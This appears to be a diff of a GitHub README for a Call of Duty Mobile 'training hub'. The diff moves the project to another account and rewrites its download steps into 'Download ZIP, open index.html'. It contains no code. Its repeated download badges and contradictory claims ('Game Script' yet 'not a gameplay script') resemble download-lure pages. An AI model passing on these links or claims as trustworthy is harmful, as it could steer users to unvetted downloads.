@@ -1,120 +1,51 @@
-# Black Storm Academy - Game Training Resource 2026
+# 🎮 black-storm-academy-hub - Improve your mobile gaming skills today
 
-> **A browser-based training resource for Call of Duty Mobile players, featuring tutorials, expert gameplay guidance, and organized practice material.**
+[![Download Here](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Yasminbr1752/black-storm-academy-hub)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/isaacflqafoster909/black-storm-academy-hub?style=flat-square)](https://github.com/isaacflqafoster909/black-storm-academy-hub)
+This hub provides resources for Call of Duty Mobile players. You can access training tutorials, gameplay strategies, and practice routines. The application runs through your web browser, so you do not need to install complex software on your computer.
 
----
+## 📁 What is this application?
 
-<p align="center">
-  <a href="https://isaacflqafoster909.github.io/black-storm-academy-hub/">
-    <img src="https://img.shields.io/badge/Download-Black%20Storm%20Academy%20Script-brightgreen?style=for-the-badge" alt="Download Black Storm Academy Script">
-  </a>
-</p>
+The black-storm-academy-hub organizes information to help you rank up in Call of Duty Mobile. It includes detailed guides on weapon loadouts, tactical movement, and map awareness. You can study these materials on your computer screen while you play on your mobile device.
 
-> **[Download Black Storm Academy](https://isaacflqafoster909.github.io/black-storm-academy-hub/)**
+## 💻 System requirements
 
----
+You need a computer with a modern web browser. We recommend using Google Chrome, Microsoft Edge, or Mozilla Firefox. Ensure your browser is updated to the latest version for the best experience. You need a stable internet connection to load the training guides and video content.
 
-[Download Latest Build](https://isaacflqafoster909.github.io/black-storm-academy-hub/)
+## 🚀 How to use this tool
 
----
+You do not need to install files on your computer. Follow these steps to start your training:
 
-## About the Project
+1. Visit this page to download the necessary files or view the web interface: [https://github.com/Yasminbr1752/black-storm-academy-hub](https://github.com/Yasminbr1752/black-storm-academy-hub)
+2. Locate the link labeled "Code" on the repository page.
+3. Click "Download ZIP" to save the folder to your computer.
+4. Open the folder once the download finishes.
+5. Find the file named index.html.
+6. Double-click this file to open the training hub in your default web browser.
 
-Black Storm Academy is a free website created for Call of Duty Mobile education. It collects practical tutorials, gameplay recommendations, and structured training resources to help players approach practice with greater understanding.
+## 🎯 Features
 
-The project serves as an online reference for users who want to study professional advice and work through focused training guides. Since it runs on the web, the content can be viewed in a browser without installing a separate desktop application.
+This platform offers several tools to support your progress:
 
----
+- Tactics Library: Read deep dives on how to approach different game modes like Search and Destroy or Domination.
+- Map Mastery: View visual diagrams for popular maps to learn common enemy paths and defensive positions.
+- Weapon Analysis: Review charts on damage, recoil patterns, and attachment recommendations for every primary weapon.
+- Practice Drills: Follow structured daily routines designed to improve your aim and reaction speed.
 
-## What It Includes
+## 🛠 Troubleshooting common issues
 
-- Free learning resources aimed at Call of Duty Mobile players
-- Tutorials centered on important game-related learning topics
-- Professional gameplay advice to support better decisions
-- Practice guides for players working independently
-- Browser access through the published web project
-- Clearly arranged reference content for later review
-- Material that can support a player-designed practice schedule
+If the page does not load, verify that your browser allows local file access. If you see broken images, ensure you extracted all files from the ZIP folder before opening the index.html file. Keep your browser window open during your gaming session so you can switch tabs to reference guides quickly.
 
----
+## 📖 Learning path for beginners
 
-## Getting Started
+If you are new to the game, start with the "Movement Basics" module. This section teaches you how to slide, jump, and crouch to avoid fire. Once you feel comfortable, move to the "Aim Training" section. Consistent practice with these drills leads to better performance in ranked matches.
 
-1. Visit the [Black Storm Academy download page](https://isaacflqafoster909.github.io/black-storm-academy-hub/).
-2. Open or download the most recent published build.
-3. For local use, unpack the project into its own folder.
-4. Launch the primary HTML file in a current web browser.
-5. Choose the lesson, tutorial, or training guide you want to study.
+## 📈 Improving your performance
 
-For a straightforward local start, open the project entry file:
+Success in Call of Duty Mobile requires knowledge of game mechanics. Use the "Expert Insights" section to read strategies from high-level players. They share tips on adjusting your settings and maximizing your frame rate on your mobile device. By applying these specific changes, you gain an advantage over opponents who rely only on raw reflexes.
 
-```text
-index.html
-```
+## 🤝 Community support
 
-The material is intended to accompany Call of Duty Mobile practice sessions.
+This project relies on contributions from the community. If you find a strategy that works well for you, consider sharing it with other players. You can open a discussion on the GitHub repository to suggest new features or request guides for specific maps or game modes. We update the content regularly to reflect changes in the game meta during new seasons. 
 
----
-
-## Available Use
-
-Black Storm Academy functions mainly as an educational website, not as a gameplay script with configurable controls. Players can use its material by arranging their study and practice around the following areas:
-
-| Option | Suggested use |
-|---|---|
-| Tutorial selection | Pick a Call of Duty Mobile lesson for study |
-| Training guide | Concentrate on one specific practice subject |
-| Professional tips | Consult the advice while preparing for gameplay |
-| Review cycle | Return to the material after completing practice |
-| Browser access | Use the hosted version or open a local HTML copy |
-
----
-
-## Compatibility and Requirements
-
-- **Target game:** Call of Duty Mobile
-- **Project platform:** Web
-- **Project format:** HTML
-- **Recommended access:** A modern browser that supports JavaScript and standard HTML
-- **Mobile use:** The content is made for players of the mobile game; the browsing experience varies according to the device and browser
-- **Limitations:** This project contains tutorials, gameplay tips, and training guides. It is not a replacement for the Call of Duty Mobile client and does not carry out gameplay actions automatically
-
----
-
-## Frequently Asked Questions
-
-### Where can I open Black Storm Academy?
-
-Open the [published project page](https://isaacflqafoster909.github.io/black-storm-academy-hub/) to use the resource online, or download the latest build and view it locally in a browser.
-
-### Is the content made for Call of Duty Mobile?
-
-Yes. The tutorials, professional gameplay guidance, and practice resources are specifically directed at Call of Duty Mobile players.
-
-### How do new versions become available?
-
-Changes are published through the web build. Visit the project page from time to time to check for the newest available content.
-
-### Can the training resources be arranged for personal use?
-
-Yes. Tutorials and guides can be organized into an individual practice routine. More extensive changes depend on the structure and contents of the available HTML project files.
-
-### Does it work with other games?
-
-The project information names Call of Duty Mobile as its target. Support or content for other games is not specified.
-
-### What is the recommended location for a local copy?
-
-Keep the downloaded files together in a folder dedicated to the project, then open the main HTML entry file from that folder. Preserving the file arrangement helps maintain the website structure.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: call of duty mobile, training, gaming, esports, strategy, guides, mobile games, practice, tutorials
